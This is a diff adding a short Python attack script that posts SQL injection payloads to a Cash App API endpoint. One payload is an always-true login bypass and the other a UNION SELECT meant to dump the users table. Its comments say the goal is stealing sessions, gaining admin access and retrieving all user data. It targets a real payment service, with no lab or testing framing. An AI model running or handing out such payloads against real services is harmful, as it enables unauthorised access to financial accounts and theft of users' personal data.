@@ -1,0 +1,20 @@
+import requests  
+
+# Replace with actual CashApp URL (example: https://cashapp.com/api/cash_tag)  
+url = "https://cashapp.com/api/cash_tag"  
+
+# Test payload to inject SQL (e.g., steal session or get admin access)  
+payload = {  
+    "tag": "' OR '1'='1 --"  # Bypasses authentication by making the condition always true  
+}  
+
+response = requests.post(url, data=payload)  
+print("Response:", response.text)  
+
+# Alternative payload to extract data (e.g., get all cash tags)  
+payload2 = {  
+    "tag": "' UNION SELECT * FROM users --"  # Retrieves all user data if vulnerable  
+}  
+
+response2 = requests.post(url, data=payload2)  
+print("Response 2:", response2.text)  
